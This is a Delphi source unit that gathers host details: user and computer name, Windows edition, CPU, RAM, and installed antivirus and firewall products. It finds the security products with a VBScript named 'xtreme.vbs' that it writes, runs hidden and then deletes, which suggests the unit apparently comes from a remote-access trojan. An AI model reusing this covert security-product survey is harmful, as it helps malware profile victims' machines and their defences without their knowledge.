Unit UnitInformacoes;

interface

type
  TSystemMem = (smMemoryLoad, smTotalPhys, smAvailPhys, smTotalPageFile,
    smAvailPageFile, smTotalVirtual, smAvailVirtual);

procedure GetFirewallandAntiVirusSoftware(var antivirus: WideString;
  var firewall: WideString);
function GetPCUser: WideString;
function GetPCName: WideString;
function GetOS: WideString;
function GetCPU: WideString;
function GetRAMSize(aSystemMem: TSystemMem): int64;

implementation

uses
  windows,
  SysUtils,
  UnitFuncoesDiversas;

procedure GetFirewallandAntiVirusSoftware(var antivirus: WideString;
  var firewall: WideString);
var
  linha: WideString;
  f: TextFile;
  VBSFile, InfoFile: WideString;
begin
  VBSFile := mytempfolder + 'xtreme.vbs';
  InfoFile := mytempfolder + 'xtreme.txt';
  AssignFile(f, VBSFile);
  ReWrite(f);
  // Stuff is needed ..
  WriteLn(f,
    'Set objSecurityCenter = GetObject("winmgmts:\\.\root\SecurityCenter")');
  WriteLn(f,
    'Set colFirewall = objSecurityCenter.ExecQuery("Select * From FirewallProduct",,48)');
  WriteLn(f,
    'Set colAntiVirus = objSecurityCenter.ExecQuery("Select * From AntiVirusProduct",,48)');
  WriteLn(f, 'Set objFileSystem = CreateObject("Scripting.fileSystemObject")');
  WriteLn(f,
    'Set objFile = objFileSystem.CreateTextFile("' + InfoFile + '", True)');
  WriteLn(f, 'Enter = Chr(13) + Chr(10)');
  WriteLn(f, 'CountFW = 0');
  WriteLn(f, 'CountAV = 0');
  // Firewall(s)
  WriteLn(f, 'For Each objFirewall In colFirewall');
  WriteLn(f, 'CountFW = CountFW + 1');
  WriteLn(f,
    'Info = Info & "F" & CountFw & ") " & objFirewall.displayName & " v" & objFirewall.versionNumber & Enter');
  WriteLn(f, 'Next');
  // AntiVirus
  WriteLn(f, 'For Each objAntiVirus In colAntiVirus');
  WriteLn(f, 'CountAV = CountAV + 1');
  WriteLn(f,
    'Info = Info & "A" & CountAV & ") " & objAntiVirus.displayName & " v" & objAntiVirus.versionNumber & Enter');
  WriteLn(f, 'Next');
  // Write to File
  WriteLn(f, 'objFile.WriteLine(Info)');
  WriteLn(f, 'objFile.Close');
  CloseFile(f);

  if FileExists(pWideChar(MyWindowsFolder + 'cscript.exe')) then
    ExecAndWait(MyWindowsFolder + 'cscript.exe', '"' + VBSFile + '"', SW_HIDE)
  else if FileExists(pWideChar(MySystemFolder + 'cscript.exe')) then
    ExecAndWait(MySystemFolder + 'cscript.exe', '"' + VBSFile + '"', SW_HIDE);
  DeleteFileW(pWidechar(VBSFile));

  antivirus := '';
  firewall := '';

  if FileExists(pWideChar(InfoFile)) = False then
    exit;

  AssignFile(f, InfoFile);
  Reset(f);
  While not eof(f) do
  begin
    Readln(f, linha); // lê do arquivo e desce uma linha. O conteúdo lido é transferido para a variável linha
    if copy(linha, 1, 1) = 'F' then
    begin
      delete(linha, 1, 4);
      firewall := firewall + linha + ' / '; // o espaço foi colocado devido a config do cliente
    end
    else // na hora de organizar os nomes
      if copy(linha, 1, 1) = 'A' then
    begin
      delete(linha, 1, 4);
      antivirus := antivirus + linha + ' / ';
    end;
  end;
  CloseFile(f);
  DeleteFileW(pWidechar(InfoFile)); // aqui ficam todos os AV/FW instalados
end;

function GetPCName: WideString;
var
  PC: pwidechar;
  Tam: Cardinal;
begin
  Result := '';
  Tam := 255;
  Getmem(PC, Tam);
  GetComputerNameW(PC, Tam);
  Result := PC;
  FreeMem(PC);
end;

function GetPCUser: WideString;
var
  User: pwidechar;
  Tam: Cardinal;
begin
  Result := '';
  Tam := 255;
  Getmem(User, Tam);
  GetUserNameW(User, Tam);
  Result := User;
  FreeMem(User);
end;


type TOSVersionInfoEx = packed record
      dwOSVersionInfoSize: DWORD;
      dwMajorVersion: DWORD;
      dwMinorVersion: DWORD;
      dwBuildNumber: DWORD;
      dwPlatformId: DWORD;
      szCSDVersion: array[0..127] of WideChar;
      wServicePackMajor: WORD;
      wServicePackMinor: WORD;
      wSuiteMask: WORD;
      wProductType: Byte;
      wReserved: Byte;
    end;
type TMyOSVersionInfo = record
      IsServerEdition:  Boolean;
      Is64BitSystem:    Boolean;
      sCompleteDesc:    WideString;
      sWindows:         WideString;
      sServicePack:     WideString;
      Major:            Cardinal;
      Minor:            Cardinal;
      Build:            Cardinal;
      Special:          Cardinal;
      ServicePackMajor: Cardinal;
      ServicePackMinor: Cardinal;
    end;

function GetVersionEx(var lpVersionInformation: TOSVersionInfoEx): BOOL; stdcall; external kernel32 name 'GetVersionExW';

var
{$EXTERNALSYM GetProductInfo}
  GetProductInfo: function(dwOSMajorVersion, dwOSMinorVersion,
    dwSpMajorVersion, dwSpMinorVersion: DWORD;
    var pdwReturnedProductType: DWORD): BOOL stdcall = NIL;

function GetOSInformation: TMyOSVersionInfo;
var
  SysInfo: TSystemInfo;
  VerInfo: TOSVersionInfoEx;
  bExtendedInfo: Boolean;
  // Only available on Windows 2008, Vista, 7 (or better)
  dwProductType: DWORD;
const
  PROCESSOR_ARCHITECTURE_AMD64 = $00000009;
  VER_NT_WORKSTATION = $00000001;
  VER_NT_DOMAIN_CONTROLLER = $00000002;
  VER_NT_SERVER = $00000003;
  VER_SUITE_BACKOFFICE = $00000004;
  VER_SUITE_BLADE = $00000400;
  VER_SUITE_COMPUTE_SERVER = $00004000;
  VER_SUITE_DATACENTER = $00000080;
  VER_SUITE_ENTERPRISE = $00000002;
  VER_SUITE_EMBEDDEDNT = $00000040;
  VER_SUITE_PERSONAL = $00000200;
  VER_SUITE_SINGLEUSERTS = $00000100;
  VER_SUITE_SMALLBUSINESS = $00000001;
  VER_SUITE_SMALLBUSINESS_RESTRICTED = $00000020;
  VER_SUITE_STORAGE_SERVER = $00002000;
  VER_SUITE_TERMINAL = $00000010;
  VER_SUITE_WH_SERVER = $00008000;
begin
  Result.IsServerEdition := False;
  Result.sWindows := 'Unknown';
  Result.Special := 0;
  Result.Major := 0;
  Result.Minor := 0;
  Result.Build := 0;
  Result.ServicePackMajor := 0;
  Result.ServicePackMinor := 0;
  Result.IsServerEdition := False;
  Result.Is64BitSystem := (sizeof(Pointer) = 8);

  bExtendedInfo := True;
  VerInfo.dwOSVersionInfoSize := sizeof(TOSVersionInfoEx);
  if not(GetVersionEx(VerInfo)) then
  begin
    bExtendedInfo := False;
    VerInfo.dwOSVersionInfoSize := sizeof(TOSVersionInfo);
    if not(GetVersionEx(VerInfo)) then
      VerInfo.dwOSVersionInfoSize := 0;
  end;

  if not(VerInfo.dwOSVersionInfoSize = 0) then
  begin
    Result.Major := VerInfo.dwMajorVersion;
    Result.Minor := VerInfo.dwMinorVersion;
    Result.Build := VerInfo.dwBuildNumber;
    Result.IsServerEdition := ((VerInfo.dwPlatformId = VER_PLATFORM_WIN32_NT)
        and not(VerInfo.wProductType = VER_NT_WORKSTATION));
    if (bExtendedInfo) then
    begin
      Result.ServicePackMajor := VerInfo.wServicePackMajor;
      Result.ServicePackMinor := VerInfo.wServicePackMinor;
    end;
    GetSystemInfo(SysInfo);

    case VerInfo.dwPlatformId of
      VER_PLATFORM_WIN32s:
        Result.sWindows := 'Windows 3.1';
      VER_PLATFORM_WIN32_WINDOWS:
        begin
          if (Result.Major = 4) and (Result.Minor = 0) then
            if (VerInfo.szCSDVersion[1] = 'C') or
              (VerInfo.szCSDVersion[1] = 'B') then
              Result.sWindows := 'Windows 95 (Release 2)'
            else
              Result.sWindows := 'Windows 95'
            else if (Result.Major = 4) and (Result.Minor = 10) and
              (VerInfo.szCSDVersion[1] = 'A') then
              Result.sWindows := 'Windows 98 SE'
            else if (Result.Major = 4) and (Result.Minor = 10) then
              Result.sWindows := 'Windows 98'
            else if (Result.Major = 4) and (Result.Minor = 90) then
              Result.sWindows := 'Windows ME';
        end;
      VER_PLATFORM_WIN32_NT:
        begin
          if (VerInfo.wProductType = VER_NT_WORKSTATION) then
          begin
            if (VerInfo.dwMajorVersion = 6) then
            begin
              if (VerInfo.dwMinorVersion = 2) then
                Result.sWindows := 'Windows 8'
              else if (VerInfo.dwMinorVersion = 3) then
                Result.sWindows := 'Windows 8.1'
              else if (VerInfo.dwMinorVersion = 1) then
                Result.sWindows := 'Windows 7'
              else if (VerInfo.dwMinorVersion = 0) then
                Result.sWindows := 'Windows Vista';

              if Assigned(GetProductInfo) then
              begin
                GetProductInfo(VerInfo.dwMajorVersion, VerInfo.dwMinorVersion,
                  VerInfo.wServicePackMajor, VerInfo.wServicePackMinor,
                  dwProductType);

                case dwProductType of
                  1:
                    Result.sWindows := Format('%s %s', [Result.sWindows,
                      'Ultimate']);
                  2:
                    Result.sWindows := Format('%s %s', [Result.sWindows,
                      'Home Basic']);
                  3:
                    Result.sWindows := Format('%s %s', [Result.sWindows,
                      'Premium']);
                  4:
                    Result.sWindows := Format('%s %s', [Result.sWindows,
                      'Enterprise']);
                  5:
                    Result.sWindows := Format('%s %s', [Result.sWindows,
                      'Home Basic N']);
                  6:
                    Result.sWindows := Format('%s %s', [Result.sWindows,
                      'Business']);
                  11:
                    Result.sWindows := Format('%s %s', [Result.sWindows,
                      'Starter']);
                  16:
                    Result.sWindows := Format('%s %s', [Result.sWindows,
                      'Business N']);
                  26:
                    Result.sWindows := Format('%s %s', [Result.sWindows,
                      'Premium N']);
                  27:
                    Result.sWindows := Format('%s %s', [Result.sWindows,
                      'Enterprise N']);
                  28:
                    Result.sWindows := Format('%s %s', [Result.sWindows,
                      'Ultimate N']);
                  48:
                    Result.sWindows := Format('%s %s', [Result.sWindows,
                      'Release Preview']);
                else
                  Result.sWindows := Format('%s %s', [Result.sWindows,
                    '(unknown edition)']);
                end;
              end;
            end
            else if (VerInfo.dwMajorVersion = 5) then
            begin
              if (VerInfo.dwMinorVersion = 2) and
                (SysInfo.wProcessorArchitecture =
                  PROCESSOR_ARCHITECTURE_AMD64) then
                Result.sWindows := 'Windows XP Professional x64'
              else if (bExtendedInfo) and
                (VerInfo.wSuiteMask and VER_SUITE_PERSONAL <> 0) and
                (VerInfo.dwMinorVersion = 1) then
                Result.sWindows := 'Windows XP Home'
              else if (VerInfo.dwMinorVersion = 1) then
                Result.sWindows := 'Windows XP Professional'
              else
                Result.sWindows := 'Windows 2000 Professional';
            end
            else
              Result.sWindows := Format('Windows NT %d.%d',
                [VerInfo.dwMajorVersion, VerInfo.dwMinorVersion]);
          end
          else
          begin
            if (VerInfo.dwMajorVersion = 6) and (VerInfo.dwMinorVersion = 0)
              then
            begin
              Result.sWindows := 'Windows 2008';

              if Assigned(GetProductInfo) then
              begin
                GetProductInfo(VerInfo.dwMajorVersion, VerInfo.dwMinorVersion,
                  VerInfo.wServicePackMajor, VerInfo.wServicePackMinor,
                  dwProductType);

                case dwProductType of
                  7:
                    Result.sWindows := Format('%s %s Server',
                      [Result.sWindows, 'Standard']);
                  8:
                    Result.sWindows := Format('%s %s Server', [Result.sWindows,
                      'Datacenter']);
                  10:
                    Result.sWindows := Format('%s %s Server', [Result.sWindows,
                      'Enterprise']);
                  12:
                    Result.sWindows := Format('%s %s Server', [Result.sWindows,
                      'Datacenter']);
                  13:
                    Result.sWindows := Format('%s %s Server',
                      [Result.sWindows, 'Standard']);
                  14:
                    Result.sWindows := Format('%s %s Server', [Result.sWindows,
                      'Enterprise']);
                  15:
                    Result.sWindows := Format('%s %s Server', [Result.sWindows,
                      'Enterprise IA64']);
                  17:
                    Result.sWindows := Format('%s %s Server',
                      [Result.sWindows, 'Web']);
                else
                  Result.sWindows := Result.sWindows +
                    ' Server (unknown edition)';
                end;
              end;
            end
            else if (VerInfo.dwMajorVersion = 5) and
              (VerInfo.dwMinorVersion = 2) then
            begin
              if (bExtendedInfo) and
                (VerInfo.wSuiteMask and VER_SUITE_DATACENTER <> 0) then
                Result.sWindows := 'Windows 2003 Server Datacenter'
              else if (bExtendedInfo) and
                (VerInfo.wSuiteMask and VER_SUITE_ENTERPRISE <> 0) then
                Result.sWindows := 'Windows 2003 Server Enterprise'
              else if (bExtendedInfo) and
                (VerInfo.wSuiteMask and VER_SUITE_BLADE <> 0) then
                Result.sWindows := 'Windows 2003 Server Web Edition'
              else
                Result.sWindows := 'Windows 2003 Server';
            end
            else if (VerInfo.dwMajorVersion = 5) and
              (VerInfo.dwMinorVersion = 2) then
            begin
              if (bExtendedInfo) and (VerInfo.wSuiteMask = VER_SUITE_WH_SERVER)
                then
                Result.sWindows := 'Windows Home Server'
              else
              begin
                if not(GetSystemMetrics(89) = 0) then
                  Result.sWindows := 'Windows 2003 Server'
                else
                  Result.sWindows := 'Windows 2003 Server (Release 2)';
              end;
            end
            else if (VerInfo.dwMajorVersion = 5) and
              (VerInfo.dwMinorVersion = 0) then
            begin
              if (bExtendedInfo) and
                (VerInfo.wSuiteMask and VER_SUITE_DATACENTER <> 0) then
                Result.sWindows := 'Windows 2000 Server Datacenter'
              else if (bExtendedInfo) and
                (VerInfo.wSuiteMask and VER_SUITE_ENTERPRISE <> 0) then
                Result.sWindows := 'Windows 2000 Server Enterprise'
              else if (bExtendedInfo) and
                (VerInfo.wSuiteMask and VER_SUITE_BLADE <> 0) then
                Result.sWindows := 'Windows 2000 Server Web Edition'
              else
                Result.sWindows := 'Windows 2000 Server';
            end
            else
            begin
              if (bExtendedInfo) and
                (VerInfo.wSuiteMask and VER_SUITE_DATACENTER <> 0) then
                Result.sWindows := 'Windows NT 4.0 Server Datacenter'
              else if (bExtendedInfo) and
                (VerInfo.wSuiteMask and VER_SUITE_ENTERPRISE <> 0) then
                Result.sWindows := 'Windows NT 4.0 Server Enterprise'
              else if (bExtendedInfo) and
                (VerInfo.wSuiteMask and VER_SUITE_BLADE <> 0) then
                Result.sWindows := 'Windows NT 4.0 Server Web Edition'
              else
                Result.sWindows := 'Windows NT 4.0 Server';
            end;
          end;
        end;
    else
      Result.sWindows := Format('Unknown Platform ID (%d)',
        [VerInfo.dwPlatformId]);
    end;
  end;

  Result.sServicePack := Format('%d.%d', [Result.ServicePackMajor,
    Result.ServicePackMinor]);
  Result.sCompleteDesc := Format('%s (Build: %d',
    [Result.sWindows, Result.Build]);
  if not(Result.ServicePackMajor = 0) then
    Result.sCompleteDesc := Result.sCompleteDesc + Format
      (' - Service Pack: %s', [Result.sServicePack]);
  Result.sCompleteDesc := Result.sCompleteDesc + ')';
end;

function GetOS: WideString;
var
  VerInfo: TMyOSVersionInfo;
begin
  @GetProductInfo := GetProcAddress(GetModuleHandle('KERNEL32.DLL'),
    'GetProductInfo');
  VerInfo := GetOSInformation;
  Result := VerInfo.sCompleteDesc;
end;

function GetCPU: WideString;
begin
  Result := '';
  Result := lerreg(HKEY_LOCAL_MACHINE,
    'HARDWARE\DESCRIPTION\System\CentralProcessor\0', 'ProcessorNameString',
    '');
end;

function GetRAMSize(aSystemMem: TSystemMem): int64;
type
  // Record for more than 2 gb RAM.
  TMemoryStatusEx = packed record
    dwLength: DWORD;
    dwMemoryLoad: DWORD;
    ullTotalPhys: int64;
    ullAvailPhys: int64;
    ullTotalPageFile: int64;
    ullAvailPageFile: int64;
    ullTotalVirtual: int64;
    ullAvailVirtual: int64;
    ullAvailExtendedVirtual: int64;
  end;

  // Function for more than 2 gb RAM (function available in Win2000+).
  PFNGlobalMemoryStatusEx = function(var lpBuffer: TMemoryStatusEx): BOOL;
    stdcall;
var
  P: Pointer;
  GlobalMemoryStatusEx: PFNGlobalMemoryStatusEx;
  CFGDLLHandle: THandle;
  MemoryStatusEx: TMemoryStatusEx; // Win2000+
  MemoryStatus: TMemoryStatus; // Win9x
  nResult: int64;
begin
  nResult := -1;
  GlobalMemoryStatusEx := nil;
  // Load library dynamicly if exists.
  CFGDLLHandle := LoadLibrary('kernel32.dll');
  if (CFGDLLHandle <> 0) then
  begin
    P := GetProcAddress(CFGDLLHandle, 'GlobalMemoryStatusEx');
    if (P = nil) then
    begin
      FreeLibrary(CFGDLLHandle);
      CFGDLLHandle := 0;
    end
    else
      GlobalMemoryStatusEx := PFNGlobalMemoryStatusEx(P);
  end;
  if (@GlobalMemoryStatusEx <> nil) then
  begin
    ZeroMemory(@MemoryStatusEx, sizeof(TMemoryStatusEx));
    MemoryStatusEx.dwLength := sizeof(TMemoryStatusEx);
    GlobalMemoryStatusEx(MemoryStatusEx);
    case aSystemMem of
      smMemoryLoad:
        nResult := MemoryStatusEx.dwMemoryLoad;
      smTotalPhys:
        nResult := MemoryStatusEx.ullTotalPhys;
      smAvailPhys:
        nResult := MemoryStatusEx.ullAvailPhys;
      smTotalPageFile:
        nResult := MemoryStatusEx.ullTotalPageFile;
      smAvailPageFile:
        nResult := MemoryStatusEx.ullAvailPageFile;
      smTotalVirtual:
        nResult := MemoryStatusEx.ullTotalVirtual;
      smAvailVirtual:
        nResult := MemoryStatusEx.ullAvailVirtual;
    end;
    FreeLibrary(CFGDLLHandle);
  end;
  // "Old" method if library is not available.
  if nResult = -1 then
  begin
    with MemoryStatus do
    begin
      dwLength := sizeof(TMemoryStatus);
      windows.GlobalMemoryStatus(MemoryStatus);
      case aSystemMem of
        smMemoryLoad:
          nResult := dwMemoryLoad;
        smTotalPhys:
          nResult := dwTotalPhys;
        smAvailPhys:
          nResult := dwAvailPhys;
        smTotalPageFile:
          nResult := dwTotalPageFile;
        smAvailPageFile:
          nResult := dwAvailPageFile;
        smTotalVirtual:
          nResult := dwTotalVirtual;
        smAvailVirtual:
          nResult := dwAvailVirtual;
      end;
    end;
  end;
  Result := nResult;
end;

end.
